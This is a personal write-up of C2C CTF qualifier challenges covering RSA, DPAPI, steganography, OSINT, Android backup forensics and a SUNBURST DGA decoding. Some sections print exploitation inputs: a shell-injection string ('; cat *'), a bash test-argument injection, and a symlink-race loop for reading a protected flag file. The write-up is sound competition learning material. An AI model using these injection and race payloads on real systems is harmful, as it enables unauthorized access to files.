# My solutions for problems solved after the C2C CTF Qualfiers

After the qualfiers had concluded, I saw that people were sharing their solutions for different problems. I decided to take advantage of this opportunity to go over challenges that I didn't get during the 24-hour period and see what I could learn. 

In my writeups, I will also try to highlight what I had gotten to on my own and how I was able to complete the challenge with others help.

## Broky

Category: Crypto

Points: 950

We were given an encrypted data file named `killswitch` and an RSA public key `public-key.pub`. With a bit of research, we find that we can directly encrypt files using an RSA public key and decrypt with the private, given that the data is smaller than or equal to the key length.

When we dump the key parameters `public-key.pub` file with `RsaCtfTool` we get the following:

~~~console
$ python3 RsaCtfTool.py --publickey public-key.pub --dumpkey
private argument is not set, the private key will not be displayed, even if recovered.
Details for public-key.pub:
n: 174776634499365185044152993509362624036904353007427805459068176329835550069164957428014245129075350521665501113613732156274308708416158135093542590677545505977327257686941870374910044600757349485405575480034556717469583373661251050825191173966631184463407966953014469657004165922729869240061652972104818333329
e: 65537
~~~

After running `RsaCtfTool` on the public key for a few minutes I saw that it wasn't very successful, so I tried looking up `n` on `factordb`. Result [here](http://factordb.com/index.php?query=174776634499365185044152993509362624036904353007427805459068176329835550069164957428014245129075350521665501113613732156274308708416158135093542590677545505977327257686941870374910044600757349485405575480034556717469583373661251050825191173966631184463407966953014469657004165922729869240061652972104818333329).


Turns out `n` is a perfect square, which is not something that I've seen in an RSA problem before. Generally perfect squares are never used for `n` because they can be factored easily. Adding to that, even though we now know the factors `p`,`q`, most standard RSA tools are not equipped to handle this special case since it almost never happens (`RsaCtfTool` and `Crypto.PublicKey.RSA.construct()` both explodes on you when you provide `p`==`q`).

Turns out that for a perfect square `n` the calculation process is a bit different. Instead of the totient(n) being `(p-1)*(q_1)`, you would do `(p-1)*p`. From this, you can just calculate `d` by finding the modular inverse of `e mod phi` or `e mod (p-1)*p`.

In my script, I had got to this point but I got stuck on being able to construct the private key using `Crypto.PublicKey.RSA.construct()`. By taking a look at a script given by `Social_Anthrax,` I found that the process of decrypting a file using an RSA key is the same as:

1. Interpreting the bytes of the file as a `long` int
2. Performing the calculation `Plaintext = Ciphertext^d mod n`
3. Converting the `plaintext` long int back to bytes and saving it as a file

For step 1. and 3., Crypto.Util.number provides the nifty `bytes_to_long` and `long_to_bytes` function which does exactly what we need it to do. Also, I didn't realize that in version Python 3.8+ the `mod` function now has the ability to calculate modular inverses like `pow(e,-1,n)` to calculate `d`. Very nifty!


You can find the full script at [exp.py](Crypto/broky/exp.py). The main logic looks like the following:

~~~py

phi = (p)*(p-1) #Different from normal RSA
d_old = modinv(e,phi)
#Alternatively...
d = pow(e,-1,phi)
print("d:",d)

print("[+] Performing checks")
assert(d_old==d)
assert(p*q==n)
assert(e*d%phi==1)

cipher = None

with open("./killswitch","rb") as f:
    cipher = bytes_to_long(f.read())
print("Ciphertext:",cipher)

#Decrypt
plain = long_to_bytes(pow(cipher,d,n))
print("Plain:",plain)

out = open('output.enc', 'wb')
out.write(plain)
out.close()
~~~

## Identify and decrypt

Cateogry: RevEng

Points: 700

**Note:** I wasn't able to get the flag from this problem but I believe that the process should work based on what I've heard from the other participants.

We were given a data file named `salvaged` and also a relevant hex string:

`dd7d71e9af727c4be5c58fd87df8e682f9b4830118d6c1b5796021dd9ed82fe565572867db629ca90d70c53071c677433a94b89b1e6ffbb8e81cb47cb7da674a`

Using `xxd`, we can view the first 8 bytes of the file to help us identify the file signature. It should be noted that file signatures can be of various lengths, from 4 to 8 bytes or even more. 

~~~console
$ xxd salvaged 
00000000: 0100 0000 d08c 9ddf 0115 d111 8c7a 00c0  .............z..
00000010: 4fc2 97eb 0100 0000 4bc9 3e4c f13c 5f46  O.......K.>L.<_F
00000020: b1dd 6bd3 fe9b d49a 0000 0000 0200 0000  ..k.............
[...]
~~~

Searching up "01 00 00 00 d0 8c 9d df" on Google we find that it is the file signature of files encrypted by DPAPI. ([ref](https://www.nirsoft.net/utils/dpapi_data_decryptor.html)) DPAPI stands for Data Protection Application Programming Interface and is a cryptographic API built in Windows that allows symmetric encryption of any type of data. According to [Wikipedia](https://en.wikipedia.org/wiki/Data_Protection_API), "thhe DPAPI keys used for encrypting the user's RSA keys are stored under %APPDATA%\Microsoft\Protect\{SID} directory, where {SID} is the Security Identifier of that user. The DPAPI key is stored in the same file as the master key that protects the users private keys. It usually is 64 bytes of random data."

Regardless, there are a number of tools out there which can decrypt DPAPI data, including the DataProtectionDecryptor tool in the first link (it didn't work for me however). We can assume that the hex string the challenge provided us with was the Master Key that can encrypted. However, I ended up spending about an hour and a half trying different solutions to decrypt the `salaved` file but no avail. The Github tools which can perform the decryption operation are all written for Python 2.7 and depends on the outdated M2Crypto library, which I wasn't able to successfully install. Apparently `Mimikatz` can also decrypt this type of file ([ref](https://miloserdov.org/?p=4205)), but after disabling my antivirus program and running it the tool had just crashed on me.

But, I digress. The important thing is that we understand how the problem *could* be solved.

Flag: ???

## Lost and Found

Category: Stego

Points: 150

We were given an image of a maze-like structure, though it's not clear from the picture whether we should solve it or even if doing that will give us more information.

However, since the picture is in black and white I should have thought about how information could be hidden in very small pixels in either the white space or black outlines. If we drop the picture in `Windows Paint` and fill in the white lines with black, we'll see the outline of the flag in the top left corner

Flag: flag{paint_is_the_old_school_cool}

## SunTzu

Category: Misc

Points: 100

We were given a website (<http://suntzu.ctf.fifthdoma.in>) that represented some ticket support system asking us for our name, explanation of technical issue, and a Captcha code for verification. Since the Captcha system stops working after the competion ended, I couldn't verify the solve but apparently you were suppose to infer that they are running some kind of bash script [see the next solve] to interpret the inputs. Additionally, since all the hints point to the `username` being the insecure field you could have done `; cat *` to escape from the bash operation and cat all the files in the current directory. There should be some files which has SunTzu quotes and another file which contains the flag.

Flag: ???

## Guess the flag

Category: Exp

Points: 100

We were given a `nc` web server which simply asks us to guess the flag. When we provide an unexpected input like `*` or two entries separated by a space we can see that it gives us back the response:

~~~console
$ nc guess-the-flag.ctf.fifthdoma.in 4242
What do you think the flag is?
*
Checking...
./run.sh: line 15: [: too many arguments
Good attempt, but no.

What do you think the flag is?
flag flag2
Checking...
./run.sh: line 15: [: too many arguments
Good attempt, but no.
~~~

If we look up the [error](https://stackoverflow.com/questions/13781216/meaning-of-too-many-arguments-error-from-if-square-brackets), we see that this is happening because bash is interpreting our input as a literal bash variable. Thus, `*` will get interpreted as all files in the current directory, which is why we get back the error of `two many arguments`. 

Assuming that the program is performing some equality check like `[ $input -eq FLAG ]`, we can use the OR (-o) and EQ (-eq) conditionals to get it to always return True. Note that if the structure had been reversed like `[ FLAG -eq $input]` we would have needed to flip our conditionals around as well.

In our case,

~~~console
$ nc guess-the-flag.ctf.fifthdoma.in 4242
What do you think the flag is?
1 -eq 1 -o abc
Checking...
You're right, the flag is FLAG{why_is_[_a_regular_command}.
~~~

gets us the flag.

Flag: FLAG{why_is_\[_a_regular_command}.

## Powershell Memory Reconstruction

Category: DFIR

Points: 200

This was an awful problem, especially after reading a write-up on how someone solved it. Link [here](https://gist.github.com/nulano/10b129d11f8e8bd6a4ff433d81aee1bd). Even that, I honestly don't quite understand how all of this work. The tl;dr is that we were given a Powershell `DMP` file and asked to find the number of unique commands that were executed. DMP files are files which are created when a program crashes or when an error occured. It captures data dumped from the memory as well as the process.

We can inspect the .dmp file using the Windows tool `WinDbg` ([ref](https://docs.microsoft.com/en-us/troubleshoot/windows-client/performance/read-small-memory-dump-file)). In there, it lists the threads that were running at the time of the crash along with what was on the stack in each thread. In the main Powershell thread we can see it ran a command of `Microsoft_PowerShell_ConsoleHost_ni!Microsoft.PowerShell.ConsoleHostUserInterface.TryInvokeUserDefinedReadLine()`. If we look up the `TryInvokeUserDefinedReadline` command we can see it goes by a more common name `PSConsoleHostReadLine`, which is the main entry point function for the module `PSReadLine`.  All of this information can be taken from the Powershell open-source Github repository. Apparently the module stores user command history in a field called _history ([ref](https://github.com/PowerShell/PSReadLine/blob/dc38b451bee4bdf07f7200026be02516807faa09/PSReadLine/History.cs#L92)). Using the debugger tool or Visual Studio in Mixed-debugging mode we can search for process running that module and look under the local variables session for `_history`.

Apparently it provided some history like this:

~~~ps1
"C:\\Users\\Challenger\\Desktop\\a.ps1"
"Set-ExecutionPolicy Unrestricted"
"Set-ExecutionPolicy unrestricted"
"C:\\Users\\Challenger\\Desktop\\a.ps1"
"set-executionpolicy unrestricted"
"C:\\Users\\Challenger\\Desktop\\a.ps1"
"Set-ExecutionPolicy unrestricted"
"C:\\Users\\Challenger\\Desktop\\a.ps1"
"Set-ExecutionPolicy Unrestricted"
"C:\\Users\\Challenger\\Desktop\\a.ps1"
"Set-ExecutionPolicy unrestricted"
"whoami"
"C:\\Users\\Challenger\\Desktop\\a.ps1"
"whoami"
"Get-Process"
"echo \"hahahahahahahaha\""
"Write-Host \"hohohohohohoho\""
"write-host \"to powershell we go\""
"whoami"
"Get-Process"
"dir env:"
"C:\\Users\\Challenger\\Desktop\\a.ps1"
"Get-ChildItem .\\"
"Get-LocalGroupMember"
"\nGet-Content C:\\Users\\Challenger\\database.db"
"echo \"keep going\""
"Write-Host \"okay done now... maybe\""
"Write-Host \"MAYBE NOT!\""
"Get-NetFirewallRule -PolicyStore ActiveStore"
~~~

Attempting to guess what the prompt means by "unique" commands we eventually come to the answer of 11 commands. 

Perhaps this would have been faster if I had just guessed `flag{1}` through `flag{100}` to cover all my bases.

Flag: flag{11}

## Ghost in the Website

Category: OSINT

Points: 200

We were asked to find the secret of `deepnoobdev`, who created his portfolio as a static website using a famous platform. That famous platform turns out to be Github (<https://github.com/deepnoobdev>). Viewing the portfolio website give us the message: "Person youre searching is not found humans can't go back in time :("

Although we (humans) can't go back in time, we can rely on computer servers which has created snapshots of websites for us. Instead of looking up the website on `Wayback Machine`, which doesn't have anything, if we search `deepnoobdev` on `archive.org` we'll get the following [snapshot](https://archive.org/details/bg_20210319)

The funny thing was that I saw this during the competition but didn't think too much of it. It might have been a moment of dumbfoundry but I didn't bother the option to view the HTML code at the bottom, which presents us with this:

~~~html
<html>
    <head>
            <title>AboutMe</title>
            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Play">
            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Orbitron">
        </head>
        <style>
            body {
                background: url(bg.jpeg) no-repeat center center fixed;
                background-position: fixed;
            }

            h1 {
                margin-top: 50px;
                font-size: 60px;
                color: white;
                font-family: orbitron;
                margin-bottom: 460px;
            }

            input[type=button] {
                margin-top: 20px;
                font-size: 40px;
                color: whitesmoke;
                border-radius: 6px;
                border: 5px solid  whitesmoke;
                background: transparent;
                font-family: Play;
            }

            input[type=button]:hover {
                background: white;
                color: black;
            }
        </style>
        <body>
            <center>
                <h1>AboutMe</h1>
                <p>Name : noob dev</p>
                <p>Age : 25 </p>
                <p>Secret : SYNT{qps1o469s5nno296369sq8sp0978nr0s} </p>
                </center>
            </body>
    </html>
~~~

When we ROT13 the secret we'll get back the flag.

Flag: FLAG{dcf4b792f8aab529692fd1fc3201ae3f}

Note: Apparently there was all kinds of red-herrings and even esolang messages that was intended for a different CTF competition, which really frustrated a number of participants.

## Leaving with cache and traces

Category: Misc

Points: 200

This problem was also one that I was very close to solving though I had started very close to the deadline so I didn't have time to look through everything. We were given a `backup.ab` file to start. AB is short for Android Backup file and it represents, well, a backup of the Android device it was taken on. It took me some time to find a tool which can extract it (why do all these challenges use such obscure technologies?), which was located [here](https://sourceforge.net/projects/android-backup-toolkit/) in the Android Backup Toolkit.

From the provided ReadMe, we see that the `android-backup-processor` tool can then be used to extract files from `backup.ab` by doing:

~~~console
$ java -jar abp.jar [-debug] [-useenv=yourenv] unpack <backup.ab> <backup.tar> [password]
~~~

We provided "1234567" as the \[password\] and was given a .tar file. Bringing this back to Ubuntu, we can extract it as normal. Inside, we see a normal directory structure with folders for 'Android', 'Telegram', 'Pictures', etc. We can search for the interesting files by doing `ls -a -R` (-a for all files, -R for recursive) or `find -type f`. In my initial look I had completely missed the `.cached` file, which had a number of .wav files with Morse code signals in them. Using a Morse sound file decoder tool we find that all except ones were just fake messages.  The real .wav file, however, which was also the largest one in size, had the following message for us:

~~~text
I A M L E A V I N G T O L O N D O N F O R F E W M O N T H T H E I M A G E I S E M B E D D E D W I T H A T E X T F I L E C O N T A I N S M Y S E C R E T K E E P I T W I T H Y O U T H E P A S S W O R D I S I K N O W M A G I C A L L I N S M A L L L E T T E R E X C E P T I
~~~

Within the `WhatsApp/Media/WhatsApp Images` folder we see three images. After running `steghide` on each of the three we were able to extract the flag from `magic.jpg`:

~~~console
$ steghide extract -sf magic.jpg -p "IknowmagIc"
the file "flag.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "flag.txt".
~~~

Flag: FLAG{02e9b430b1a2b8f5ce8a337e6799f2c8}

Note: There was also a red herring about checking the 'metadata' on the image files, since there was nothing to be retrieved from the provided screenshots and Whatsapp images metadata.

## Happy or Sad

Category: DFIR

Points: 200

We were given two folders of cat images, one named `Happy` and the other one `Sad`. When I tried to get the "diff" of images in either folder using `ImageMagick`'s `compare` utility,

~~~console
$ compare -compose src id01.jpg id48.jpg diff.pngs
~~~

I just get back some random pixel differences in the pictures. 

First, assuming that some or most of the pictures are exact duplicates of each other (save one or two), we can use `fdupes` to remove duplicate files in either directory. 

`fdupes -R -d .`

where the -R flag is for recursive operation, and -d is for deleting duplicates.

We see that only two images remain in the `sad` folder while nothing was deleted in the `happy` folder. Examining the remaining pictures in the `sad` folder we that see one contains a hidden .zip folder, which we can extract using binwalk:

~~~console
$ binwalk -e id16.JPG 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
65644         0x1006C         Zip archive data, at least v2.0 to extract, compressed size: 383, uncompressed size: 547, name: password.txt
66163         0x10273         End of Zip archive, footer length: 22
~~~

Examining the result we find a `password.txt` file:

~~~text
jordy2t
dawde1r
LOL121345
22510834185
1234564789
w4rcr4ft
truipp808
[...]
~~~

We can assume that this password list is meant to be used on the `happy` cat images. The first thing we could try is by iteratively performing `steghide` on each of the images. Lucky for us, there is a tool called `stegseek` which allows us to automate this process. 

Using the following simple bash script,

~~~sh
#!/bin/bash

for i in $(seq 1 10);
do
    stegseek --crack -sf ./happy/id0$i.jpg -wl ./password.txt -xf out.txt -f 
    cat out.txt >> flag.txt
done

for i in $(seq 10 50);
do
    stegseek --crack -sf ./happy/id$i.jpg -wl ./password.txt -xf out.txt -f
    cat out.txt >> flag.txt
done
~~~

We were able to find the flag.

Flag: FLAG{78b024dfe63b7078e91d049d204f0a57}

## Trapdoor

Category: DFIR

Points: 200

Prompt:

~~~text
What is the local infected computer's domain name where the backdoor call to the C2 is fivu4vjamve5vfrt5uwsruf0212eu1.appsync-api.us-west-2.avsvmcloud.com
Flag will be in the format FLAG{domain.name}
~~~

**Side Note:** Do NOT go to this domain name, as it will undoubtedly trigger firewall protection by your school or antivirus software, and a network admin will undoubtedly come after you for clicking on a malicious link (it's not actually malicious).

This problem was particularly interesting for the concepts that it covered. If you look up the domain name you'll see that `appsync-api.us-west-2.avsvmcloud.com` is associated with the SUNBURST backdoor that was part of the Solarwinds hack. From what I've read in [ref_1](https://securelist.com/sunburst-connecting-the-dots-in-the-dns-requests/99862/), [ref_2](https://www.fireeye.com/blog/threat-research/2020/12/sunburst-additional-technical-details.html), and [ref_3](https://cybersecurityventures.com/solarwinds-sunburst-backdoor-dga-and-infected-domain-analysis/), the exploitation process consisted of:

1. Placing a malicious DLL code file nicknamed `SUNBURST` into the the Solarwinds Orion IT packages through a supply-chain attack. Specifically, SUNBURST is a trojanized version of a the Orion plugin called `SolarWinds.Orion.Core.BusinessLayer.dlll`
2. Once victims have download the latest Orion packages with the malware inside, the malware will go to sleep for up to 2 weeks
3. After checking that no analysis tools and antivirus programs are present, the backdoor attempt to contact the C&C (Command and Control) server by sending encoded DNS requests (explained more below).

The SUNBURST backdoor uses a [Domain Generation Algorithm](https://en.wikipedia.org/wiki/Domain_generation_algorithm)(DGA) to construct strings which it appends to the `avsvmcloud[.]com` (e.g., the domain associated with Solarwindows), like the one we saw from the challenge prompt. The constructed string which contains encoded information about the victim domain name. The backdoor then interprets the DNS responses in an unusual way from the clinet to receive orders from the C2 coordinator.

**Aside:** Normally DGA is used as a way for malware to construct random domain names which it could reach the commanding server through without using a static domain list, which could be easily be blacklisted by authorities. DGE generates a large number of domain names in which the malware would attempt to contact everyday until it finds a hit. For example, a simple DGA could be one that generates uses time information:

~~~py
def generate_domain(year: int, month: int, day: int) -> str:
    """Generate a domain name for the given date."""
    domain = ""

    for i in range(16):
        year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17)
        month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8)
        day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12)
        domain += chr(((year ^ month ^ day) % 25) + 97)

    return domain + ".com"
~~~

While the authorities would be faced with trying blacklist tens of thousands possible domain combinations (sometimes needing to update them on a daily basis), the attacker would only need to register a select few domain names from the DGA ensure that the malware would reach the C2 server in a certain time frame.

Specific details in the way that the subdomain name is generated by Sunburst can be found in the first reference article ([ref1](https://securelist.com/sunburst-connecting-the-dots-in-the-dns-requests/99862/)). The C2 server then reviews the list and it sends back a DNS response for the ones it deems interesting with a CNAME record to a second level C&C server. At that point, the second level C2 server will provide the malware with commands like to exfiltrate data and establish a persistent connection between the victim and attacker.

At the end of all these, there are scripts on Github which can decode the Sunburst DGA subdomains, including <https://github.com/2igosha/sunburst_dga>. Downloading the tool and adding an entry for our target C2 link in `uniq-hostnames.txt`, we find it decode to the following domain:

~~~text
domain name part UID (0x8ED10B325E2EA0D1) offset 35 = favreau.local
~~~

Flag: flag{favreau.local}
# Impossible Problems

As part of the competition, there were some problems that people just didn't seem to be able to solve. I'll try to detail them here.

## Functionally the Same

Category: RevEng

Points: 150

We were given the following assembly dump and were asked to find the flag from it:

~~~assembly
Dump of assembler code for function main:
   0x000055555555515c <+0>:     push   rbp
   0x000055555555515d <+1>:     mov    rbp,rsp
=> 0x0000555555555160 <+4>:     mov    eax,0x0
   0x0000555555555165 <+9>:     call   0x555555555135 <function>
   0x000055555555516a <+14>:    mov    esi,eax
   0x000055555555516c <+16>:    lea    rdi,[rip+0xe91]        # 0x555555556004
   0x0000555555555173 <+23>:    mov    eax,0x0
   0x0000555555555178 <+28>:    call   0x555555555030 <printf@plt>
   0x000055555555517d <+33>:    mov    eax,0x0
   0x0000555555555182 <+38>:    pop    rbp
   0x0000555555555183 <+39>:    ret    
End of assembler dump.
~~~

This, of course, was impossible to do since we weren't given a binary to work with. If we were, we could have opened it with `gdb` and do `x/s *0x555555556004` to view the string stored at that location. And no, this is not a standard memory location that is common across all binaries (is there even such a thing?)

Flag: Impossible

## FusSyscat

Category: Misc

Points: 150

To be honest, I didn't attempt this challenge before it broke (apparently it was modified by some user who solved the challenge), and so I didn't really know what the normal behavior was. After the original file was modified no one else was able to attempt the challenge. If I remember correctly it was allowing us a limited bash shell.

Apparently some people were able to somehow download the running binary back to their computer for reverse engineering / decompiling. They then find out that the program was making a call to stripped function which called `perror(lstat)` or `stat` to check if the file `flag.txt` in the current directory was a regular file. It if it was then the program will output its content, otherwise it will exit. 

Since we want to get the contents at `flag/flag.txt`, we could employ TOCTOU or "Time of check to Time of Use" trick where we first make the `flag.txt` a normal blank text file to satisfy the `lstat` check and then immediately make it a symbolic link to `flag/flag.txt` so that when the program attempts to read from it the actual flag file will be outputted instead.

This is the exploit command that `Oshawk` sent to the `nc` server to solve the challenge:

~~~sh
while true; do touch flag.txt; rm flag.txt; ln -s /flag/flag.txt flag.txt; rm flag.txt; done &
while true; do fussycat flag.txt 2>/dev/null | grep {; done
~~~

Flag: Impossible (for most people)
